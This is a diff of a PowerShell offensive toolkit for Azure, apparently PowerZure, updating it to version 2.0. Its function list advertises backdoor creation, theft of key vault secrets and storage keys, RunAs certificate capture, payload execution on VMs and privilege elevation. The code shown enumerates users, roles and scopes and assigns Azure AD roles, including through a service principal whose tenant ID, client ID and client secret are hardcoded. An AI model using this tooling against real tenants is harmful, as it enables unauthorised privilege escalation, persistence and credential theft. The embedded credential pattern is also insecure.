@@ -66,73 +66,50 @@ function PowerZure
     {
             Write-Host @"
 			
-			  PowerZure Version 1.2
+			  PowerZure Version 2.0
 
 				List of Functions              
 
-------------------Operational --------------
-
-Set-Subscription ------- Sets the default Subscription to operate in
-Execute-Command -------- Will run a command on a specified VM
-Execute-MSBuild -------- Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.
-Execute-Program -------- Executes a supplied program. 
-Create-Backdoor -------- Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
-                         Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
-                         This requires an account that is part of the 'Administrators' Role (Needed to make a user)
-Execute-Backdoor ------- This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
-Execute-CommandRunbook - Will execute a command from a runbook that is ran with a "RunAs" account
-Start-Runbook ---------- Starts a specific Runbook
-Upload-StorageContent -- Uploads a supplied file to a storage share.
-Stop-VM ---------------- Stops a VM
-Start-VM --------------- Starts a VM
-Restart-VM ------------- Restarts a VM
-Create-User   ---------- Creates a user in Azure AD
-Set-Password ----------- Sets a user's password in Azure AD
-Set-Group -------------- Adds a user to an Azure AD group
-Set-Role --------------- Adds a user to a role for a resource or a subscription
-Remove-Role ------------ Removes a user from a role on a resource or subscription
-Set-AADRoleSP ---------- Sets a user's role in Azure AD while logged in as a Service Principal
-Add-SPSecret  ---------- Sets a secret to a Service Principal
-Add-ElevatedPrivileges - Elevates the user's privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC. 
-
 ------------------Info Gathering -------------
 
-Get-Targets ------------ Compares your role to your scope to determine what you have access to and what kind of access it is (Read/write/execute).	
-Get-CurrentUser -------- Returns the current logged in user name, their role + groups, and any owned objects
-Get-AllUsers ----------- Lists all users in the subscription
-Get-User --------------- Gathers info on a specific user
-Get-AllGroups ---------- Lists all groups + info within Azure AD
-Get-Resources ---------- Lists all resources in the subscription
-Get-GroupMembers ------- Gets all the members of a specific group. Group does NOT mean role.
-Get-AllGroupMembers ---- Gathers all the group members of all the groups.
-Get-AllRoleMembers ----- Gets all the members of all roles. Roles does not mean groups.
-Get-RoleMembers -------- Gets the members of a role 
-Get-Roles -------------- Gets the roles of a user
-Get-ServicePrincipals -- Returns all service principals
-Get-ServicePrincipal --- Returns all info on a specified service principal
-Get-Apps --------------- Returns all applications and their Ids
-Get-AppOwners ---------- Returns all owners of every Application in Azure AD
-Get-AppPermissions ----- Returns the permissions of an app
-Get-WebApps ------------ Gets running webapps
-Get-WebAppDetails ------ Gets running webapps details
-Get-RunAsCertificate --- Gets the login credentials for an Automation Accounts "RunAs" service principal
-Get-AADRoleMembers ----- Lists the active roles in Azure AD and what users are part of the role
-Get-RunAsAccounts ------ Finds any RunAs accounts being used by an Automation Account
-           
------------------Data Exfiltration--------------
-Get-KeyVaults ---------- Lists the Key Vaults
-Get-KeyVaultContents --- Get the keys, secrets, and certificates from a specific Key Vault
-Get-AllKeyVaultContents -Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to           
-Get-StorageAccounts ---- Gets all storage accounts
-Get-StorageAccountKeys - Gets the account keys for a storage account
-Get-StorageContents ---- Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
-Get-Runbooks ----------- Lists all the Runbooks
-Get-RunbookContent ----- Reads content of a specific Runbook
-Get-AvailableVMDisks --  Lists the VM disks available. 
-Get-VMDisk ------------- Generates a link to download a Virtual Machiche's disk. The link is only available for an hour.
-Get-VMs ---------------- Lists available VMs     
-Get-SQLDBs ------------- Lists all SQL Servers and their Databases + Administrator usernames
-			
+Get-AzureADRole -------------------- Gets the members of one or all Azure AD role. Roles does not mean groups.
+Get-AzureAppOwners ----------------- Returns all owners of all Applications in AAD
+Get-AzureGroup --------------------- Gathers a specific group or all groups in AzureAD and lists their members.
+Get-AzureIntuneScript -------------- Lists available Intune scripts in Azure Intune
+Get-AzureLogicAppConnector --------- Lists the connector APIs in Azure
+Get-AzureRole ---------------------- Gets the members of an Azure RBAC role.
+Get-AzureRunAsAccounts ------------- Finds any RunAs accounts being used by an Automation Account
+Get-AzureRolePermission ------------ Finds all roles with a certain permission
+Get-AzureSQLDB --------------------- Lists the available SQL Databases on a server
+Get-AzureTargets ------------------- Compares your role to your scope to determine what you have access to
+Get-AzureUser ---------------------- Gathers info on a specific user or all users including their groups and roles in Azure & AzureAD
+Show-AzureCurrentUser -------------- Returns the current logged in user name and any owned objects
+Show-AzureKeyVaultContent ---------- Lists all available content in a key vault
+Show-AzureStorageContent ----------- Lists all available storage containers, shares, and tables
+
+------------------Operational --------------
+
+Add-AzureADGroup ---------------- Adds a user to an Azure AD Group
+Add-AzureADRole ----------------- Assigns a specific Azure AD role to a User
+Add-AzureSPSecret --------------- Adds a secret to a service principal
+Add-AzureRole ------------------- Adds a role to a user in Azure
+Create-AzureBackdoor ------------ Creates a backdoor in Azure via Service Principal
+Export-AzureKeyVaultContent ----- Exports a Key as PEM or Certificate as PFX from the Key Vault
+Get-AzureKeyVaultContent -------- Get the secrets and certificates from a specific Key Vault or all of them
+Get-AzureRunAsCertificate ------- Will gather a RunAs accounts certificate if one is being used by an automation account, which can then be used to login as that account. 
+Get-AzureRunbookContent --------- Gets a specific Runbook and displays its contents or all runbook contents
+Get-AzureStorageContent --------- Gathers a file from a specific blob or File Share
+Get-AzureVMDisk ----------------- Generates a link to download a Virtual Machiche’s disk. The link is only available for 24 hours.
+Invoke-AzureCommandRunbook ------ Will execute a supplied command or script from a Runbook if the Runbook is configured with a “RunAs” account
+Invoke-AzureRunCommand ---------- Will run a command or script on a specified VM
+Invoke-AzureRunMSBuild ---------- Will run a supplied MSBuild payload on a specified VM. 
+Invoke-AzureRunProgram ---------- Will run a given binary on a specified VM
+New-AzureUser ------------------- Creates a user in Azure Active Directory
+New-AzureIntuneScript ----------- Uploads a PS script to Intune
+Set-AzureElevatedPrivileges ----- Elevates the user’s privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
+Set-AzureSubscription ----------- Sets default subscription. Necessary if in a tenant with multiple subscriptions.
+Set-AzureUserPassword ----------- Sets a user’s password
+Start-AzureRunbook -------------- Starts a Runbook	
 "@
 
         }
@@ -177,9 +154,9 @@ Write-Host @'
 		        $username = $APSUser.Account
 		        $user = Get-AzADUser -UserPrincipalName $Username 
 		        $userid=$user.id
-		        $rbacroles = Get-AzRoleAssignment -ObjectId $user.id
+		        $rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1
 		        $obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
-		        $obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
+		        $obj | Add-Member -MemberType NoteProperty -Name objectId -Value $userId
 		        $rolearray = @()
                 $scopearray = @()
 	            $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
@@ -228,7 +205,7 @@ Write-Host @'
     }
 }
 
-Powerzure -Checks -Banner -Welcome 
+PowerZure -Checks -Banner -Welcome 
 
 function Show-AzureCurrentUser
 {
@@ -240,7 +217,7 @@ function Show-AzureCurrentUser
 		$username = $APSUser.Account
 		$user = Get-AzADUser -UserPrincipalName $Username 
 		$userid=$user.id
-		$rbacroles = Get-AzRoleAssignment -ObjectId $user.id
+		$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1
 		$obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
 		$obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
 		$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
@@ -256,7 +233,16 @@ function Show-AzureCurrentUser
 			$uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
 			$roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
 			$rolearray += $roledef.displayName
-            $scopearray += $roledef.resourceScopes
+            If($aadrole.resourceScope.length -gt 2)
+            {
+                $roleid = $aadrole.resourceScope.Split('/')[1]
+                $appdata = Get-AzADApplication -ObjectId $roleid
+                $scopearray += $appdata.DisplayName
+            }
+            else
+            {
+                $scopearray += $aadrole.resourceScope
+            }
 		}
 		$obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
         $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
@@ -419,14 +405,26 @@ function Get-AzureUser
 			$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
 			$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope
 			$rolearray = @()
+            $scopearray = @()
 			ForEach ($aadrole in $aadroles)
 			{
 				$id = $aadrole.roleDefinitionId
 				$uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
 				$roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
 				$rolearray += $roledef.displayName
+                If($aadrole.resourceScope.length -gt 2)
+                {
+                    $roleid = $aadrole.resourceScope.Split('/')[1]
+                    $appdata = Get-AzADApplication -ObjectId $roleid
+                    $scopearray += $appdata.DisplayName
+                }
+                else
+                {
+                    $scopearray += $aadrole.resourceScope
+                }
 			}
 			$obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
+            $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
 			$uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
 			$body =
 @"
@@ -451,46 +449,63 @@ function Get-AzureUser
 	{
 			  
 		$obj = New-Object -TypeName psobject
-		$user = Get-AzADUser -UserPrincipalName $Username 
-		$userid=$user.id
-		$rbacroles = Get-AzRoleAssignment -ObjectId $user.id
-		$obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
-		$obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
-		$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
-		$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope
-		$rolearray = @()
-        $scopearray = @()
-	    $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
-	    $data = Invoke-RestMethod -Headers $Headers -Uri $uri 
-	    $aadroles = $data.value
-		ForEach ($aadrole in $aadroles)
-		{
-			$id = $aadrole.roleDefinitionId
-			$uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
-			$roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
-			$rolearray += $roledef.displayName
-            $scopearray += $roledef.resourceScopes
-		}
-		$obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
-        $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
-		$uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
+		$user = Get-AzADUser -UserPrincipalName $Username
+        If($user)
+        { 
+		    $userid=$user.id
+		    $rbacroles = Get-AzRoleAssignment -ObjectId $user.id
+		    $obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
+		    $obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
+		    $obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
+		    $obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope
+		    $rolearray = @()
+            $scopearray = @()
+	        $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
+	        $data = Invoke-RestMethod -Headers $Headers -Uri $uri 
+	        $aadroles = $data.value
+		    ForEach ($aadrole in $aadroles)
+		    {
+			    $id = $aadrole.roleDefinitionId
+			    $uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
+			    $roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
+			    $rolearray += $roledef.displayName
+                If($aadrole.resourceScope.length -gt 2)
+                {
+                    $roleid = $aadrole.resourceScope.Split('/')[1]
+                    $appdata = Get-AzADApplication -ObjectId $roleid
+                    $scopearray += $appdata.DisplayName
+                }
+                else
+                {
+                    $scopearray += $aadrole.resourceScope
+                }
+		    }
+		    $obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
+            $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
+		    $uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
 		$body =
 @"
 {	"securityEnabledOnly": "False"
 }
 "@
-		$grouparray = @()
-		$groupdata = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $body -Method Post -Contenttype application/json			
-		$groupids = $groupdata.value
-		foreach ($groupid in $groupids)
-		{
-			$groupstuff= Get-AzADGroup -Objectid $groupid
-			$grouparray += $groupstuff.DisplayName
-		}
+		    $grouparray = @()
+		    $groupdata = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $body -Method Post -Contenttype application/json			
+		    $groupids = $groupdata.value
+		    foreach ($groupid in $groupids)
+		    {
+			    $groupstuff= Get-AzADGroup -Objectid $groupid
+			    $grouparray += $groupstuff.DisplayName
+		    }
 
-		$obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray		
-		$obj
+		    $obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray		
+		    $obj
+        }
+        If(!$user)
+        {
+            Write-Host "$Username does not exist in this tenant" -ForegroundColor Red
+        }
     }
+
     If(!$Username -and !$All)
     {
         Write-Host "Usage:" -ForegroundColor Red
@@ -586,6 +601,7 @@ function Add-AzureADRole
     -UserID (Intended User or Service Principal by ID)
     -Role (Intended role)
     -RoleId (Intended role by Id)
+	-ServicePrincipal (Add a role as a service principal)
 
 .EXAMPLE
     Add-AzureADRole -Username test@test.com -Role 'Company Administrator'
@@ -594,87 +610,186 @@ function Add-AzureADRole
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$Username = $null,
+	[Parameter(Mandatory=$false)][Switch]$ServicePrincipal = $null,
     [Parameter(Mandatory=$false)][String]$UserId = $null,
     [Parameter(Mandatory=$false)][String]$RoleId = $null,
     [Parameter(Mandatory=$false)][String]$Role = $null)
 
-    $Headers = Get-AzureGraphToken 
-    If($Username)
-    {
-        If($Role)
-        {
-	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
-	        $roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
-            $userdata = Get-AzADUser -UserPrincipalName $username
-            $UsersId = $userdata.Id
-	        $RolesId = $roledata.id
-            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
+     
+	If(!$ServicePrincipal)
+	{
+		$Headers = Get-AzureGraphToken
+		If($Username)
+		{
+			If($Role)
+			{
+				$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+				$roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
+				$userdata = Get-AzADUser -UserPrincipalName $username
+				$UsersId = $userdata.Id
+				$RolesId = $roledata.id
+				$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
 $body = @"
 {	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
 }
 "@
-	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
-            If($req -eq "")
-            {
-                Write-Host "Successfully added $Username to $Role" -ForegroundColor Green
-            }
-        }
-        If($RoleID)
-        {
-	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
-            $userdata = Get-AzADUser -UserPrincipalName $username
-            $UsersId = $userdata.Id
-            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $Username to $Role" -ForegroundColor Green
+			}
+		}
+		If($RoleID)
+		{
+			$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+			$userdata = Get-AzADUser -UserPrincipalName $username
+			$UsersId = $userdata.Id
+			$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
 $body = @"
 {	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
 }
 "@
-	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
-            If($req -eq "")
-            {
-                Write-Host "Successfully added $Username to $RoleID" -ForegroundColor Green
-            }
-        }
-    }
-    If($UserId)
-    {
-        If($Role)
-        {
-	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
-	        $roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
-	        $RolesId = $roledata.id
-            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $Username to $RoleID" -ForegroundColor Green
+			}
+		}
+	}
+	If($UserId)
+	{
+		If($Role)
+		{
+			$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+			$roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
+			$RolesId = $roledata.id
+			$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
 $body = @"
 {	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
 }
 "@
-	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
-            If($req -eq "")
-            {
-                Write-Host "Successfully added $UsedID to $Role"
-            }
-        }
-        If($RoleID)
-        {
-	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
-            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $UsedID to $Role"
+			}
+		}
+		If($RoleID)
+		{
+			$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+			$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
 $body = @"
 {	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
 }
 "@
-	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
-            If($req -eq "")
-            {
-                Write-Host "Successfully added $UsedID to $RoleID"
-            }
-        }
-    }
-    If(!$Role -and $RoleId -and !$Username -and !$UserId)
-    {
-        Write-Host "Usage" -ForegroundColor Red
-        Write-Host "Add-AzureADRole -Username test@test.com -Role 'Company Administrator'" -ForegroundColor Red
-        Write-Host "Add-AzureADRole -UserId 1234567-4568-4579-dede-97709e94e300 -RoleId '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
-    }
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $UsedID to $RoleID"
+			}
+		}
+	}
+		If(!$Role -and $RoleId -and !$Username -and !$UserId)
+		{
+			Write-Host "Usage" -ForegroundColor Red
+			Write-Host "Add-AzureADRole -Username test@test.com -Role 'Company Administrator'" -ForegroundColor Red
+			Write-Host "Add-AzureADRole -UserId 1234567-4568-4579-dede-97709e94e300 -RoleId '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
+		}
+	}
+	If($ServicePrincipal)
+	{
+		$TenantId = 'ba8c4db2-44fa-427a-a380-6e59cb50bb88'
+		$ClientId = 'e6b9bb83-fa0f-4694-92ae-d8e8c8144489'
+		$ClientSecret = 'TopSecret!'
+		$RequestAccessTokenUri = "https://login.microsoftonline.com/$TenantId/oauth2/token"	 
+		#REST Resource
+		#$Resource = "https://management.azure.com/"
+		#Graph Resource
+		$Resource = "https://graph.microsoft.com/"
+		$body = "grant_type=client_credentials&client_id=$ClientId&client_secret=$ClientSecret&resource=$Resource"
+		$AppToken = Invoke-RestMethod -Method Post -Uri $RequestAccessTokenUri -Body $body -ContentType 'application/x-www-form-urlencoded'
+
+		$Headers = @{}
+
+		#For Service Principals
+		$Headers.Add("Authorization","$($AppToken.token_type) "+ " " + "$($AppToken.access_token)")	
+		If($Username)
+		{
+			If($Role)
+			{
+				$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+				$roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
+				$userdata = Get-AzADUser -UserPrincipalName $username
+				$UsersId = $userdata.Id
+				$RolesId = $roledata.id
+				$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
+$body = @"
+{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
+}
+"@
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $Username to $Role" -ForegroundColor Green
+			}
+		}
+		If($RoleID)
+		{
+			$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+			$userdata = Get-AzADUser -UserPrincipalName $username
+			$UsersId = $userdata.Id
+			$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
+$body = @"
+{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
+}
+"@
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $Username to $RoleID" -ForegroundColor Green
+			}
+		}
+	}
+	If($UserId)
+	{
+		If($Role)
+		{
+			$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+			$roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
+			$RolesId = $roledata.id
+			$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
+$body = @"
+{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
+}
+"@
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $UsedID to $Role"
+			}
+		}
+		If($RoleID)
+		{
+			$rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
+			$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
+$body = @"
+{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
+}
+"@
+			$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
+			If($req -eq "")
+			{
+				Write-Host "Successfully added $UsedID to $RoleID"
+			}
+		}
+	}
+		If(!$Role -and $RoleId -and !$Username -and !$UserId)
+		{
+			Write-Host "Usage" -ForegroundColor Red
+			Write-Host "Add-AzureADRole -Username test@test.com -Role 'Company Administrator'" -ForegroundColor Red
+			Write-Host "Add-AzureADRole -UserId 1234567-4568-4579-dede-97709e94e300 -RoleId '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
+		}
+	}
 }
 
 function Show-AzureKeyVaultContent
@@ -1054,6 +1169,26 @@ function Get-AzureRunbookContent
     }
 }
 
+function Restart-AzureVM
+{
+ <#
+.SYNOPSIS
+    Restarts an Azure VM
+
+.PARAMETER
+    -Name (Name of VM)
+
+.EXAMPLE
+    Restart-AzureVM -Name Testvm01
+
+#>
+    [CmdletBinding()]
+     Param(
+    [Parameter(Mandatory=$true)][String]$Name = $null)
+	$vm = Get-AzVM -name $Name
+	Restart-AzVM -Name $Name -ResourceGroupName $vm.ResourceGroupName
+}
+
 function Start-AzureRunbook
 {
 <#
@@ -1368,267 +1503,58 @@ function Get-AzureTargets
 .SYNOPSIS 
     Checks your role against the scope of your role to determine what you have access to. 
 #>
+    $Context = Get-AzContext
+    $user = Get-AzADUser -UserPrincipalName $Context.Account
+    $userid=$user.id
+    $Headers = Get-AzureGraphToken
+    $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
+    $data = Invoke-RestMethod -Headers $Headers -Uri $uri 
+    $aadroles = $data.value
+    Write-Host "Your AzureAD Roles and their scopes" -ForegroundColor Green 
+    ForEach ($aadrole in $aadroles)
+    {
+	    $id = $aadrole.roleDefinitionId
+	    $uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
+	    $roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
+        Write-Host ""
+        Write-Host $roledef.DisplayName -ForegroundColor Yellow
+        If($aadrole.resourceScope.length -gt 2)
+        {
+            $roleid = $aadrole.resourceScope.Split('/')[1]
+            $appdata = Get-AzADApplication -ObjectId $roleid
+            $appdata.DisplayName
 
-$UID = az ad signed-in-user show --query 'userPrincipalName' -o tsv
-$assignments = az role assignment list --all --query "[?principalName=='$UID'].{Scope:scope,Role:roleDefinitionName}" | ConvertFrom-Json
+        }
+        else
+        {
+            $aadrole.resourceScope
+        }
+    }
+    Write-host ""
+    Write-Host "Your Azure Roles and their scopes" -ForegroundColor Green 
+    $roleassignments = Get-AzRoleAssignment | Where-Object {$_.Objectid -eq "$userid"}
+    ForEach($role in $roleassignments)
+    {
+        $scope = $role.scope
+        Write-Host $role.RoleDefinitionName -ForegroundColor Yellow   
+        $definitions = Get-AzRoleDefinition -Name $role.RoleDefinitionName  
+        Write-Host $definitions.Description    
+        Write-Host ""
+        Write-Host "Scope: " $scope
+        Write-Host ""
+        Write-Host "Resources in scope"   
+        $Resources = Get-AzResource | Where-Object {$_.ResourceId -match "$scope"}
+        ForEach($resource in $resources)
+        {
+            Write-Host "Resource name: " $resource.Name
+            Write-Host "Resource type: " $resource.ResourceType
+            write-host ""
+        }
 
-	ForEach ($assignment in $assignments)
-		{
-			$role = az role assignment list --all --query "[?principalName=='$UID'].{Role:roleDefinitionName}" -o tsv
-			Write-Host "Role:" $role -ForegroundColor Green
-			Write-Host "Scope:" $assignment.Scope -ForegroundColor Green
-			Write-host ""
-			$sub = az account list | ConvertFrom-Json
-			$subid = $sub.id
-			$rglist =  az group list | ConvertFrom-Json
-			$permissions= az role definition list --name $role | ConvertFrom-Json
-			$actions = $permissions.permissions.actions
-			ForEach ($action in $actions)
-			{
-				$paths = $action.Split("/")
-				If ($paths.count -eq 1)
-				{
-					$rt = $paths[0]
-					If ($rt -eq '*')
-					{
-						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 1)
-						{
-							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result		
-							Write-host ""							
-						}
-					}
-					elseif ($rt -eq 'write')
-					{
-						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" | ConvertFrom-Json
-						If ($result.length -gt 1)
-						{
-							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}
-					elseif ($rt -eq 'read')
-					{
-						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" | ConvertFrom-Json
-						If ($result.length -gt 1)
-						{
-							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result		
-							Write-host ""							
-						}
-					}
-					elseif ($rt -eq 'action')
-					{
-						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" | ConvertFrom-Json
-						If ($result.length -gt 1)
-						{
-							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result	
-							Write-host ""							
-						}
-					}			
-				}				
-				If ($paths.count -eq 3)
-				{
-					$rt = $paths[0] + "/" + $paths[1]
-					$last = $action.Split("/") | select -last 1
-					
-					if ($last -eq '*')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'write')
-					{
-						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
-						If ($result.length -gt 0)
-						{
-							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
-							Write-host ""
-							$result		
-							Write-host ""							
-						}
-					}
-					elseif ($last -eq 'read')
-					{
